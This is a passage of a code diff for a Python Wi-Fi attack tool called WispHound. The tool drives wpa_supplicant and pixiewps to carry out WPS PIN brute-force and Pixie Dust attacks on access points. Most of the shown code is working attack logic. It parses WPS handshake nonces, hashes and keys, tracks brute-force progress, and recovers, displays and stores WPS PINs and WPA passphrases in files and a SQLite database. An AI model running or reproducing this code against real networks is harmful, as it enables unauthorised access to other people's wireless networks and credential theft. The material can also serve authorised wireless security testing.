-        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
-            w = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
-            if header: w.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
-            w.writerow([dateStr, bssid, essid, pin, psk])
-    except OSError as e:
-        print(UI.msg('err', f'Failed to write credentials to {filename}: {e}'),
-              file=sys.stderr)
-        return
-    print(UI.msg('info', f'Credentials saved to {filename}.txt, {filename}.csv'),
-          file=sys.stderr)
-    if db:
-        try: db.save_credentials(bssid, essid, pin, psk)
-        except Exception as e:
-            print(UI.msg('err', f'Failed to save to DB: {e}'), file=sys.stderr)
-    if json_mode:
-        rec = {'ts': datetime.now().isoformat(), 'event': 'credentials',
-               'bssid': bssid, 'essid': essid, 'wps_pin': pin, 'wpa_psk': psk}
-        print(json.dumps(rec, ensure_ascii=False), file=json_stdout, flush=True)
-
-
 def _handle_backend_result(result, bssid, db=None, save_result=False,
-                           reports_dir=None, json_mode=False, json_stdout=None):
+                           reports_dir=None, json_mode=False):
     if not result.success:
         if result.error == 'wps_locked':
-            print(UI.msg('err', f'AP {UI.hi(bssid)} has locked WPS'), file=sys.stderr)
+            print(UI.msg('err', f'AP {UI.hi(bssid)} has locked its WPS interface'))
         elif result.error == 'rate_limited':
-            print(UI.msg('warn', f'AP {UI.hi(bssid)} rate-limits — backing off'),
-                  file=sys.stderr)
-        elif result.error == 'dry_run':
-            print(UI.msg('info', '(dry-run) no attack executed'), file=sys.stderr)
-        elif result.error in ('timeout', 'not_found'):
+            print(UI.msg('warn', f'AP {UI.hi(bssid)} rate-limiting detected — back off'))
+        elif result.error == 'timeout':
+            pass
+        elif result.error == 'not_found':
             pass
         else:
-            print(UI.msg('err', f'Attack unsuccessful against {UI.hi(bssid)}'),
-                  file=sys.stderr)
+            print(UI.msg('err', f'Attack unsuccessful against {UI.hi(bssid)}'))
         return False
-    print(UI.section('Credentials recovered'), file=sys.stderr)
-    print(UI.table(['Field', 'Value'],
-                   [[UI.muted('WPS PIN'), UI.ok(result.pin)],
-                    [UI.muted('WPA PSK'), UI.ok(result.psk)],
-                    [UI.muted('ESSID'),   UI.hi(result.essid or '—')]],
-                   aligns=['l', 'l']), file=sys.stderr)
-    if save_result and reports_dir:
-        _save_result(db, bssid, result.essid, result.pin, result.psk,
-                     reports_dir, json_mode, json_stdout or sys.stdout)
+
+    print(UI.section('Credentials recovered'))
+    print(UI.table(
+        ['Field', 'Value'],
+        [[UI.muted('WPS PIN'), UI.ok(result.pin)],
+         [UI.muted('WPA PSK'), UI.ok(result.psk)],
+         [UI.muted('ESSID'),   UI.hi(result.essid or '—')]],
+        aligns=['l', 'l'], title=None))
+
+    if json_mode:
+        rec = {
+            'ts': datetime.now().isoformat(),
+            'event': 'credentials',
+            'wps_pin': result.pin,
+            'wpa_psk': result.psk,
+            'essid': result.essid,
+            'bssid': bssid,
+        }
+        print(json.dumps(rec, ensure_ascii=False), flush=True)
+
     if db:
-        try: db.save_credentials(bssid, result.essid, result.pin, result.psk)
+        try:
+            db.save_credentials(bssid, result.essid, result.pin, result.psk)
         except Exception as e:
-            print(UI.msg('err', f'Failed to save to DB: {e}'), file=sys.stderr)
+            print(UI.msg('err', f'Failed to save credentials to DB: {e}'))
+
+    # [FIX] Always resolve the reports dir to a writable location.
+    if save_result:
+        reports_dir = reports_dir or pick_reports_dir()
+        try:
+            os.makedirs(reports_dir, exist_ok=True)
+            filename = os.path.join(reports_dir, 'stored')
+            dateStr = datetime.now().strftime('%d.%m.%Y %H:%M')
+            with open(filename + '.txt', 'a', encoding='utf-8') as f:
+                f.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {result.essid}\n'
+                        f'WPS PIN: {result.pin}\nWPA PSK: {result.psk}\n\n')
+            header = not os.path.isfile(filename + '.csv')
+            with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
+                w = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
+                if header:
+                    w.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
+                w.writerow([dateStr, bssid, result.essid, result.pin, result.psk])
+            print(UI.msg('info', f'Credentials saved to {filename}.txt, {filename}.csv'))
+        except OSError as e:
+            print(UI.msg('err', f'Failed to save credentials to {reports_dir}: {e}'))
+
     return True
 
 
@@ -1113,9 +1456,12 @@ class ConnectionStatus:
         self.wpa_psk = ''
         self.nack_count = 0
         self.locked = False
-        self.bssid = ''  # set dynamically in PBC mode
-    def isFirstHalfValid(self): return self.last_m_message > 5
-    def clear(self): self.__init__()
+
+    def isFirstHalfValid(self):
+        return self.last_m_message > 5
+
+    def clear(self):
+        self.__init__()
 
 
 class BruteforceStatus:
@@ -1126,27 +1472,36 @@ class BruteforceStatus:
         self.attempts_times = collections.deque(maxlen=15)
         self.counter = 0
         self.statistics_period = 5
+
     def display_status(self):
         avg = statistics.mean(self.attempts_times) if self.attempts_times else 0
-        if not self.mask or not self.mask.isdigit(): pct = 0.0
-        elif len(self.mask) <= 4: pct = int(self.mask) / 10000 * 100
+        if not self.mask or not self.mask.isdigit():
+            pct = 0.0
+        elif len(self.mask) <= 4:
+            pct = int(self.mask) / 11000 * 100
         elif len(self.mask) >= 7:
-            pct = (10000 + int(self.mask[4:7])) / 11000 * 100
-        else: pct = int(self.mask) / 10000 * 100
+            pct = ((10000 / 11000) + (int(self.mask[4:7]) / 11000)) * 100
+        else:
+            pct = int(self.mask) / 11000 * 100
         print(UI.info(f'[*] {pct:.2f}% complete @ {self.start_time} '
-                      f'({avg:.2f} seconds/pin)'), file=sys.stderr)
+                      f'({avg:.2f} seconds/pin)'))
+
     def registerAttempt(self, mask):
-        self.mask = mask; self.counter += 1
+        self.mask = mask
+        self.counter += 1
         now = time.time()
         self.attempts_times.append(now - self.last_attempt_time)
         self.last_attempt_time = now
         if self.counter == self.statistics_period:
-            self.counter = 0; self.display_status()
-    def clear(self): self.__init__()
+            self.counter = 0
+            self.display_status()
+
+    def clear(self):
+        self.__init__()
 
 
 # ---------------------------------------------------------------------------
-# TargetDB — additive migration (lockout_until, pixie_capture, last_channel)
+# TargetDB
 # ---------------------------------------------------------------------------
 class TargetDB:
     SCHEMA = """
@@ -1161,132 +1516,100 @@ class TargetDB:
         prefix TEXT PRIMARY KEY, vendor TEXT
     );
     """
-    NEW_COLS = [
-        ('lockout_until', 'TEXT'),
-        ('pixie_capture', 'TEXT'),
-        ('last_channel', 'INTEGER DEFAULT 0'),
-    ]
 
     def __init__(self, path):
         self.path = path
         Path(path).parent.mkdir(parents=True, exist_ok=True)
         self.conn = sqlite3.connect(path)
         self.conn.executescript(self.SCHEMA)
-        self._migrate()
         self.conn.commit()
         self._seed_oui()
 
-    def _migrate(self):
-        cur = self.conn.execute('PRAGMA table_info(targets)')
-        existing = {row[1] for row in cur.fetchall()}
-        for col, decl in self.NEW_COLS:
-            if col not in existing:
-                self.conn.execute(f'ALTER TABLE targets ADD COLUMN {col} {decl}')
-        self.conn.commit()
-
     def _seed_oui(self):
-        self.conn.executemany('INSERT OR IGNORE INTO oui_vendor (prefix, vendor) VALUES (?,?)',
-                              list(OUI_BUILTIN.items()))
+        self.conn.executemany(
+            'INSERT OR IGNORE INTO oui_vendor (prefix, vendor) VALUES (?,?)',
+            list(OUI_BUILTIN.items()))
         self.conn.commit()
 
     def load_oui_file(self, path):
-        rows = []
         with open(path, 'r', encoding='utf-8', errors='replace') as f:
+            rows = []
             for line in f:
                 line = line.strip()
-                if not line or line.startswith('#'): continue
+                if not line or line.startswith('#'):
+                    continue
                 parts = re.split(r'\s+', line, maxsplit=1)
                 if len(parts) == 2:
                     prefix = parts[0].replace(':', '').replace('-', '').upper()[:6]
                     rows.append((prefix, parts[1]))
-        self.conn.executemany('INSERT OR IGNORE INTO oui_vendor (prefix, vendor) VALUES (?,?)', rows)
-        self.conn.commit()
+            self.conn.executemany(
+                'INSERT OR IGNORE INTO oui_vendor (prefix, vendor) VALUES (?,?)',
+                rows)
+            self.conn.commit()
 
     def vendor_for(self, bssid):
         prefix = bssid.replace(':', '').upper()[:6]
-        r = self.conn.execute('SELECT vendor FROM oui_vendor WHERE prefix=?', (prefix,)).fetchone()
-        return r[0] if r else 'Unknown'
+        cur = self.conn.execute(
+            'SELECT vendor FROM oui_vendor WHERE prefix=?', (prefix,))
+        row = cur.fetchone()
+        return row[0] if row else 'Unknown'
 
     def upsert(self, net):
         self.conn.execute("""
             INSERT INTO targets (bssid, essid, model, model_number, device_name,
-                                 chipset, pixie_vuln, locked, last_seen, last_channel)
-            VALUES (?,?,?,?,?,?,?,?, datetime('now'), ?)
+                                 chipset, pixie_vuln, locked, last_seen)
+            VALUES (?,?,?,?,?,?,?,?, datetime('now'))
             ON CONFLICT(bssid) DO UPDATE SET
                 essid=excluded.essid, model=excluded.model,
                 model_number=excluded.model_number,
-                device_name=excluded.device_name, chipset=excluded.chipset,
-                pixie_vuln=excluded.pixie_vuln, locked=excluded.locked,
-                last_seen=datetime('now'), last_channel=excluded.last_channel
+                device_name=excluded.device_name,
+                chipset=excluded.chipset, pixie_vuln=excluded.pixie_vuln,
+                locked=excluded.locked, last_seen=datetime('now')
         """, (net['BSSID'], net.get('ESSID', 'HIDDEN'), net.get('Model', ''),
               net.get('Model number', ''), net.get('Device name', ''),
               net.get('Chipset', ''), int(net.get('Pixie vulnerable', False)),
-              int(net.get('WPS locked', False)),
-              int(net.get('Channel', 0) or 0)))
+              int(net.get('WPS locked', False))))
         self.conn.commit()
 
     def known_pin(self, bssid):
-        r = self.conn.execute('SELECT wps_pin FROM targets WHERE bssid=? '
-                              'AND wps_pin IS NOT NULL AND wps_pin != ""',
-                              (bssid,)).fetchone()
-        return r[0] if r else None
+        cur = self.conn.execute(
+            'SELECT wps_pin FROM targets WHERE bssid=? AND wps_pin IS NOT NULL '
+            'AND wps_pin != ""', (bssid,))
+        row = cur.fetchone()
+        return row[0] if row else None
 
     def save_credentials(self, bssid, essid, pin, psk):
-        cur = self.conn.execute('UPDATE targets SET wps_pin=?, wpa_psk=?, success=1 WHERE bssid=?',
-                                (pin, psk, bssid))
+        cur = self.conn.execute(
+            'UPDATE targets SET wps_pin=?, wpa_psk=?, success=1 '
+            'WHERE bssid=?', (pin, psk, bssid))
         if cur.rowcount == 0:
-            self.conn.execute('INSERT INTO targets (bssid, essid, wps_pin, wpa_psk, success, '
-                              'last_seen) VALUES (?,?,?,?,1, datetime("now"))',
-                              (bssid, essid, pin, psk))
+            self.conn.execute(
+                'INSERT INTO targets (bssid, essid, wps_pin, wpa_psk, success, '
+                'last_seen) VALUES (?,?,?,?,1, datetime("now"))',
+                (bssid, essid, pin, psk))
         self.conn.commit()
 
     def bump_attempts(self, bssid):
-        self.conn.execute('UPDATE targets SET attempts = attempts + 1 WHERE bssid=?', (bssid,))
+        self.conn.execute(
+            'UPDATE targets SET attempts = attempts + 1 WHERE bssid=?',
+            (bssid,))
         self.conn.commit()
-
-    def save_capture(self, bssid, pixie: PixiewpsData):
-        self.conn.execute('UPDATE targets SET pixie_capture=? WHERE bssid=?',
-                          (json.dumps(pixie.to_dict()), bssid))
-        if self.conn.total_changes == 0:
-            self.conn.execute('INSERT OR IGNORE INTO targets (bssid, pixie_capture, last_seen) '
-                              'VALUES (?,?, datetime("now"))', (bssid, json.dumps(pixie.to_dict())))
-        self.conn.commit()
-
-    def load_capture(self, bssid):
-        r = self.conn.execute('SELECT pixie_capture FROM targets WHERE bssid=?',
-                              (bssid,)).fetchone()
-        if r and r[0]:
-            try: return PixiewpsData.from_dict(json.loads(r[0]))
-            except Exception: return None
-        return None
-
-    def set_lockout(self, bssid, seconds):
-        until = (datetime.utcnow() + timedelta(seconds=seconds)).isoformat()
-        self.conn.execute('UPDATE targets SET lockout_until=? WHERE bssid=?', (until, bssid))
-        self.conn.commit()
-
-    def is_locked(self, bssid):
-        r = self.conn.execute('SELECT lockout_until FROM targets WHERE bssid=?',
-                              (bssid,)).fetchone()
-        if not r or not r[0]: return False
-        try: return datetime.fromisoformat(r[0]) > datetime.utcnow()
-        except Exception: return False
 
     def close(self):
-        try: self.conn.close()
-        except Exception: pass
+        try:
+            self.conn.close()
+        except Exception:
+            pass
 
 
 # ---------------------------------------------------------------------------
-# Companion (internal backend) — threaded reader, per-attempt reset,
-# --save-capture, --offline replay, --pixie-force bypass
+# Companion
 # ---------------------------------------------------------------------------
 class Companion:
     def __init__(self, interface, save_result=False, print_debug=False,
                  bssid='', db: Optional[TargetDB] = None,
-                 json_mode=False, trace_log=None, pixiewps_timeout=120,
-                 cool_down=60, auto_mode=False, save_capture=False,
-                 dry_run=False, json_stdout=None, lockout_budget=0):
+                 json_mode=False, trace_log=None,
+                 pixiewps_timeout=120, cool_down=60, auto_mode=False):
         self.interface = interface
         self.save_result = save_result
         self.print_debug = print_debug
@@ -1294,385 +1617,459 @@ class Companion:
         self.pixiewps_timeout = pixiewps_timeout
         self.cool_down = cool_down
         self.auto_mode = auto_mode
-        self.save_capture = save_capture
-        self.dry_run = dry_run
-        self.json_stdout = json_stdout or sys.stdout
-        self.lockout_budget = lockout_budget
         self._constructed = False
-        self._line_q = queue.Queue()
-        self._reader_stop = threading.Event()
-        self._reader_thread = None
 
         self.tempdir = tempfile.mkdtemp()
         try:
-            self.tempconf = os.path.join(self.tempdir, 'wpa.conf')
-            with open(self.tempconf, 'w', encoding='utf-8') as f:
-                f.write(f'ctrl_interface={self.tempdir}\nctrl_interface_group=root\nupdate_config=1\n')
+            with tempfile.NamedTemporaryFile(
+                    mode='w', suffix='.conf', delete=False) as temp:
+                temp.write(
+                    f'ctrl_interface={self.tempdir}\n'
+                    'ctrl_interface_group=root\nupdate_config=1\n')
+                self.tempconf = temp.name
             self.wpas_ctrl_path = f'{self.tempdir}/{interface}'
             self.__init_wpa_supplicant()
-            self.res_socket_file = os.path.join(tempfile.gettempdir(), f'wh-{uuid.uuid4().hex}.sock')
+
+            self.res_socket_file = (
+                f'{tempfile._get_default_tempdir()}/'
+                f'{next(tempfile._get_candidate_names())}')
             self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
             self.retsock.bind(self.res_socket_file)
         except Exception:
-            self._cleanup_partial(); raise
+            self._cleanup_partial()
+            raise
 
         self.pixie_creds = PixiewpsData()
         self.connection_status = ConnectionStatus()
 
-        home = _homedir()
+        home = str(pathlib.Path.home())
         self.sessions_dir = os.path.join(home, '.WispHound', 'sessions')
         self.pixiewps_dir = os.path.join(home, '.WispHound', 'pixiewps')
+
+        # [FIX] Use the writable reports dir picked at runtime.
         self.reports_dir = pick_reports_dir()
         for d in (self.sessions_dir, self.pixiewps_dir, self.reports_dir):
-            _safe_makedirs(d)
+            try:
+                os.makedirs(d, exist_ok=True)
+            except OSError:
+                # Will surface when actually writing.
+                pass
 
         self.db = db or TargetDB(os.path.join(home, '.WispHound', 'targets.db'))
         self._own_db = db is None
+
         self.generator = WPSpin()
         self.bssid = bssid
         self.lastPwr = 0
         self.target_is_pixie_vuln = False
         self.target_chipset = ''
+
         self._trace_fp = open(trace_log, 'a', encoding='utf-8') if trace_log else None
         self._constructed = True
 
-    # --- lifecycle ---
     def _cleanup_partial(self):
-        self._reader_stop.set()
-        if self._reader_thread: self._reader_thread.join(timeout=1)
         try:
-            if getattr(self, 'retsock', None): self.retsock.close()
-        except Exception: pass
+            if getattr(self, 'retsock', None):
+                self.retsock.close()
+        except Exception:
+            pass
         try:
-            if getattr(self, 'res_socket_file', None) and os.path.exists(self.res_socket_file):
+            if getattr(self, 'res_socket_file', None) and \
+                    os.path.exists(self.res_socket_file):
                 os.remove(self.res_socket_file)
-        except Exception: pass
+        except Exception:
+            pass
         try:
             if getattr(self, 'wpas', None):
                 self.wpas.terminate()
-                try: self.wpas.wait(timeout=2)
-                except Exception: self.wpas.kill()
-        except Exception: pass
+                try:
+                    self.wpas.wait(timeout=2)
+                except Exception:
+                    self.wpas.kill()
+        except Exception:
+            pass
         shutil.rmtree(getattr(self, 'tempdir', ''), ignore_errors=True)
-        try: os.remove(getattr(self, 'tempconf', ''))
-        except Exception: pass
+        try:
+            os.remove(getattr(self, 'tempconf', ''))
+        except Exception:
+            pass
 
     def cleanup(self):
         self._cleanup_partial()
         if getattr(self, '_trace_fp', None):
-            try: self._trace_fp.close()
-            except Exception: pass
+            try:
+                self._trace_fp.close()
+            except Exception:
+                pass
         if getattr(self, '_own_db', False) and getattr(self, 'db', None):
             self.db.close()
 
     def __del__(self):
-        try: self.cleanup()
-        except Exception: pass
+        try:
+            self.cleanup()
+        except Exception:
+            pass
 
-    # --- wpa_supplicant ---
     def __init_wpa_supplicant(self):
-        if self.dry_run:
-            self.wpas = None; return
-        print(UI.msg('run', 'Running wpa_supplicant…'), file=sys.stderr)
-        argv = ['wpa_supplicant', '-K', '-d', '-Dnl80211,wext,hostapd,wired',
+        print(UI.msg('run', 'Running wpa_supplicant…'))
+        argv = ['wpa_supplicant', '-K', '-d',
+                '-Dnl80211,wext,hostapd,wired',
                 f'-i{self.interface}', f'-c{self.tempconf}']
         self.wpas = subprocess.Popen(
-            argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-            encoding='utf-8', errors='replace', start_new_session=True)
-        _register_child(self.wpas)
-        # reader thread pushes lines into a queue
-        def reader():
-            try:
-                for line in self.wpas.stdout:
-                    if self._reader_stop.is_set(): break
-                    self._line_q.put(line.rstrip('\n'))
-            except Exception: pass
-            finally: self._line_q.put(None)  # EOF sentinel
-        self._reader_thread = threading.Thread(target=reader, daemon=True)
-        self._reader_thread.start()
-        deadline = time.time() + 10
-        while time.time() < deadline:
-            if self.wpas.poll() is not None:
-                raise ValueError(f'wpa_supplicant exited rc={self.wpas.returncode}')
+            argv, stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
+        while True:
+            ret = self.wpas.poll()
+            if ret is not None and ret != 0:
+                raise ValueError(
+                    'wpa_supplicant returned an error: '
+                    + (self.wpas.communicate()[0] or ''))
             if os.path.exists(self.wpas_ctrl_path):
-                return
-            time.sleep(0.05)
-        raise ValueError('wpa_supplicant did not create control socket within 10s')
+                break
+            time.sleep(.1)
 
     def sendOnly(self, command):
-        if self.dry_run: return
         self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
 
     def sendAndReceive(self, command):
-        if self.dry_run: return 'OK'
         self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
-        try: b, _ = self.retsock.recvfrom(4096)
-        except Exception: return ''
+        b, _ = self.retsock.recvfrom(4096)
         return b.decode('utf-8', errors='replace')
-
-    def _drain_q(self, timeout=0.05):
-        """Drain queued wpa_supplicant lines into __handle_wpas (non-blocking)."""
-        got = False
-        try:
-            line = self._line_q.get(timeout=timeout)
-        except queue.Empty:
-            return True
-        if line is None: return False
-        self._process_line(line)
-        got = True
-        while True:
-            try: line = self._line_q.get_nowait()
-            except queue.Empty: break
-            if line is None: return False
-            self._process_line(line)
-        return True
 
     @staticmethod
     def _explain_wpas_not_ok_status(command, respond):
         if command.startswith(('WPS_REG', 'WPS_PBC')) and respond == 'UNKNOWN COMMAND':
-            return ('[!] wpa_supplicant is compiled without WPS support (CONFIG_WPS=y)')
-        return '[!] Something went wrong — check --trace-log'
+            return ('[!] wpa_supplicant is compiled without WPS protocol support. '
+                    'Rebuild with CONFIG_WPS=y')
+        return '[!] Something went wrong — check out debug log'
 
     def _emit_json(self, event, **fields):
-        if not self.json_mode: return
+        if not self.json_mode:
+            return
         rec = {'ts': datetime.now().isoformat(), 'event': event, **fields}
-        print(json.dumps(rec, ensure_ascii=False), file=self.json_stdout, flush=True)
+        print(json.dumps(rec, ensure_ascii=False), flush=True)
 
-    def _process_line(self, line):
-        if self.print_debug:
+    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None,
+                      bssid=''):
+        if verbose is None:
+            verbose = self.print_debug
+        line = self.wpas.stdout.readline()
+        if not line:
+            self.wpas.wait()
+            return False
+        line = line.rstrip('\n')
+
+        if verbose:
             sys.stderr.write(line + '\n')
-        if self._trace_fp: self._trace_fp.write(line + '\n')
+        if self._trace_fp:
+            self._trace_fp.write(line + '\n')
 
         if line.startswith('WPS: '):
-            self._handle_wps_line(line)
-        elif ': State: ' in line and '-> SCANNING' in line:
-            self.connection_status.status = 'scanning'
-            self.__print_with_indicators('*', 'Scanning…')
+            if 'Building Message M' in line:
+                n = int(line.split('Building Message M')[1].replace('D', ''))
+                self.connection_status.last_m_message = n
+                self.__print_with_indicators(
+                    '*', f'Sending WPS Message M{n}…')
+            elif 'Received M' in line:
+                n = int(line.split('Received M')[1])
+                self.connection_status.last_m_message = n
+                self.__print_with_indicators(
+                    '*', f'Received WPS Message M{n}')
+                if n == 5:
+                    print(UI.msg('ok', 'The first half of the PIN is valid'))
+            elif 'Received WSC_NACK' in line:
+                self.connection_status.status = 'WSC_NACK'
+                self.connection_status.nack_count += 1
+                self.__print_with_indicators('*', 'Received WSC NACK')
+                print(UI.msg('err', 'Wrong PIN code'))
+            elif 'Enrollee Nonce' in line and 'hexdump' in line:
+                self.pixie_creds.e_nonce = get_hex(line)
+                if pixiemode:
+                    print(UI.muted(f'[P] E-Nonce: {self.pixie_creds.e_nonce}'))
+            elif 'Registrar Nonce' in line and 'hexdump' in line:
+                self.pixie_creds.r_nonce = get_hex(line)
+                if pixiemode:
+                    print(UI.muted(f'[P] R-Nonce: {self.pixie_creds.r_nonce}'))
+            elif 'DH own Public Key' in line and 'hexdump' in line:
+                self.pixie_creds.pkr = get_hex(line)
+                if pixiemode:
+                    print(UI.muted(f'[P] PKR: {self.pixie_creds.pkr}'))
+            elif 'DH peer Public Key' in line and 'hexdump' in line:
+                self.pixie_creds.pke = get_hex(line)
+                if pixiemode:
+                    print(UI.muted(f'[P] PKE: {self.pixie_creds.pke}'))
+            elif 'AuthKey' in line and 'hexdump' in line:
+                self.pixie_creds.authkey = get_hex(line)
+                if pixiemode:
+                    print(UI.muted(f'[P] AuthKey: {self.pixie_creds.authkey}'))
+            elif 'E-Hash1' in line and 'hexdump' in line:
+                self.pixie_creds.e_hash1 = get_hex(line)
+                if pixiemode:
+                    print(UI.muted(f'[P] E-Hash1: {self.pixie_creds.e_hash1}'))
+            elif 'E-Hash2' in line and 'hexdump' in line:
+                self.pixie_creds.e_hash2 = get_hex(line)
+                if pixiemode:
+                    print(UI.muted(f'[P] E-Hash2: {self.pixie_creds.e_hash2}'))
+            elif 'E-S1' in line and 'hexdump' in line:
+                self.pixie_creds.e_s1 = get_hex(line)
+                if pixiemode:
+                    print(UI.muted(f'[P] E-S1: {self.pixie_creds.e_s1}'))
+            elif 'E-S2' in line and 'hexdump' in line:
+                self.pixie_creds.e_s2 = get_hex(line)
+                if pixiemode:
+                    print(UI.muted(f'[P] E-S2: {self.pixie_creds.e_s2}'))
+            elif 'Network Key' in line and 'hexdump' in line:
+                self.connection_status.status = 'GOT_PSK'
+                self.connection_status.wpa_psk = bytes.fromhex(
+                    get_hex(line)).decode('utf-8', errors='replace')
+        elif ': State: ' in line:
+            if '-> SCANNING' in line:
+                self.connection_status.status = 'scanning'
+                self.__print_with_indicators('*', 'Scanning…')
         elif 'WPS-FAIL' in line and self.connection_status.status != '':
             self.connection_status.status = 'WPS_FAIL'
-            print(UI.msg('err', 'wpa_supplicant returned WPS-FAIL'), file=sys.stderr)
+            print(UI.msg('err', 'wpa_supplicant returned WPS-FAIL'))
         elif 'Trying to authenticate with' in line:
             self.connection_status.status = 'authenticating'
-            if 'SSID' in line: self.connection_status.essid = self._extract_essid(line)
+            if 'SSID' in line:
+                self.connection_status.essid = self._extract_essid(line)
             self.__print_with_indicators('*', 'Authenticating…')
         elif 'Authentication response' in line:
             self.__print_with_indicators('*', 'Authenticated')
         elif 'Trying to associate with' in line:
             self.connection_status.status = 'associating'
-            if 'SSID' in line: self.connection_status.essid = self._extract_essid(line)
-            self.__print_with_indicators('*', 'Associating…')
+            if 'SSID' in line:
+                self.connection_status.essid = self._extract_essid(line)
+            self.__print_with_indicators('*', 'Associating with AP…')
         elif 'Associated with' in line and self.interface in line:
             b = line.split()[-1].upper()
-            self.__print_with_indicators('+', f'Associated with {b}')
+            if self.connection_status.essid:
+                self.__print_with_indicators(
+                    '+', f'Associated with {b} '
+                         f'(ESSID: {self.connection_status.essid})')
+            else:
+                self.__print_with_indicators('+', f'Associated with {b}')
         elif 'EAPOL: txStart' in line:
             self.connection_status.status = 'eapol_start'
-        elif self.bssid and self.bssid.lower() in line.lower() and 'level=' in line:
-            try:
-                self.lastPwr = line.split('level=')[1].split(' ')[0]
-            except IndexError: pass
-        elif 'selected BSS ' in line:
-            try:
-                self.connection_status.bssid = line.split('selected BSS ')[-1].split()[0].upper()
-            except IndexError: pass
+            self.__print_with_indicators('*', 'Sending EAPOL Start…')
+        elif 'EAP entering state IDENTITY' in line:
+            self.__print_with_indicators('*', 'Received Identity Request')
+        elif 'using real identity' in line:
+            self.__print_with_indicators('*', 'Sending Identity Response…')
+        elif bssid and bssid in line.lower() and 'level=' in line:
+            self.lastPwr = line.split('level=')[1].split(' ')[0]
+            if 'noise=' in line:
+                noise = line.split('noise=')[1].split(' ')[0]
+                print(UI.msg('info', f'Current signal: {self.lastPwr}, noise: {noise}'))
+            else:
+                print(UI.msg('info', f'Current signal: {self.lastPwr}'))
+        elif pbc_mode and ('selected BSS ' in line):
+            b = line.split('selected BSS ')[-1].split()[0].upper()
+            self.connection_status.bssid = b
+            print(UI.msg('info', f'Selected AP: {b}'))
 
-    def _handle_wps_line(self, line):
-        pairs = (
-            ('Enrollee Nonce', 'e_nonce', 'E-Nonce'),
-            ('Registrar Nonce', 'r_nonce', 'R-Nonce'),
-            ('DH own Public Key', 'pkr', 'PKR'),
-            ('DH peer Public Key', 'pke', 'PKE'),
-            ('AuthKey', 'authkey', 'AuthKey'),
-            ('E-Hash1', 'e_hash1', 'E-Hash1'),
-            ('E-Hash2', 'e_hash2', 'E-Hash2'),
-            ('E-S1', 'e_s1', 'E-S1'),
-            ('E-S2', 'e_s2', 'E-S2'),
-            ('R-S1', 'r_s1', 'R-S1'),
-            ('R-S2', 'r_s2', 'R-S2'),
-        )
-        if 'Building Message M' in line:
-            try: n = int(line.split('Building Message M')[1].replace('D', ''))
-            except ValueError: n = 0
-            self.connection_status.last_m_message = n
-            self.__print_with_indicators('*', f'Sending M{n}…')
-            return
-        if 'Received M' in line:
-            try: n = int(line.split('Received M')[1])
-            except ValueError: n = 0
-            self.connection_status.last_m_message = n
-            self.__print_with_indicators('*', f'Received M{n}')
-            if n == 5:
-                print(UI.msg('ok', 'First half of the PIN is valid'), file=sys.stderr)
-            return
-        if 'Received WSC_NACK' in line:
-            self.connection_status.status = 'WSC_NACK'
-            self.connection_status.nack_count += 1
-            print(UI.msg('err', 'WSC NACK — wrong PIN'), file=sys.stderr)
-            return
-        if 'Network Key' in line and 'hexdump' in line:
-            self.connection_status.status = 'GOT_PSK'
-            try:
-                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
-            except Exception: pass
-            return
-        if 'hexdump' not in line: return
-        for needle, attr, label in pairs:
-            if needle in line:
-                val = get_hex(line)
-                if val:
-                    setattr(self.pixie_creds, attr, val)
-                    if self.print_debug:
-                        print(UI.muted(f'[P] {label}: {val}'), file=sys.stderr)
-                return
+        return True
 
     @staticmethod
     def _extract_essid(line):
         try:
             raw = "'".join(line.split("'")[1:-1])
-            try:
-                b = codecs.escape_decode(raw.encode('latin1', 'replace'))[0]
-                return b.decode('utf-8', errors='replace')
-            except Exception:
-                return raw
+            return (codecs.decode(raw, 'unicode-escape')
+                    .encode('latin1').decode('utf-8', errors='replace'))
         except Exception:
             return ''
 
-    # --- Pixie Dust ---
     def __runPixiewps(self, showcmd=False, full_range=False, _retry=True):
-        self.__print_with_indicators('*', 'Running pixiewps…')
-        self.__print_with_indicators('P', self.pixie_creds.status_line())
+        self.__print_with_indicators('*', 'Running Pixiewps…')
+        self.__print_with_indicators(
+            'P', self.pixie_creds.status_line())
         try:
-            argv = self.pixie_creds.get_pixie_args(full_range, timeout=self.pixiewps_timeout)
+            argv = self.pixie_creds.get_pixie_args(
+                full_range, timeout=self.pixiewps_timeout)
         except ValueError as e:
-            print(UI.msg('err', f'Pixiewps data validation failed: {e}'), file=sys.stderr)
+            print(UI.msg('err', f'Pixiewps data validation failed: {e}'))
             return False
-        if showcmd or self.dry_run:
-            print(UI.muted('  ' + ' '.join(argv)), file=sys.stderr)
+
+        if showcmd:
+            print(UI.muted('  ' + ' '.join(argv)))
         self._emit_json('pixiewps_start', argv=argv, full_range=full_range)
-        if self.dry_run: return False
+
         try:
-            rc, out = run_proc(argv, timeout=self.pixiewps_timeout,
-                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                               encoding='utf-8', errors='replace')
+            r = subprocess.run(
+                argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                encoding='utf-8', errors='replace',
+                timeout=self.pixiewps_timeout)
         except subprocess.TimeoutExpired:
-            print(UI.msg('err', f'pixiewps timed out after {self.pixiewps_timeout}s'),
-                  file=sys.stderr)
+            print(UI.msg('err', f'pixiewps timed out after {self.pixiewps_timeout}s'))
+            self._emit_json('pixiewps_timeout',
+                            timeout=self.pixiewps_timeout)
             return False
         except FileNotFoundError:
-            print(UI.msg('err', 'pixiewps not found'), file=sys.stderr)
+            print(UI.msg('err', 'pixiewps binary not found in PATH'))
             return False
-        out = out or ''
-        print(out, file=sys.stderr)
-        self._emit_json('pixiewps_output', rc=rc, out=out)
-        if rc != 0 and 'WPS pin' not in out:
-            return False
+
+        out = r.stdout or ''
+        print(out)
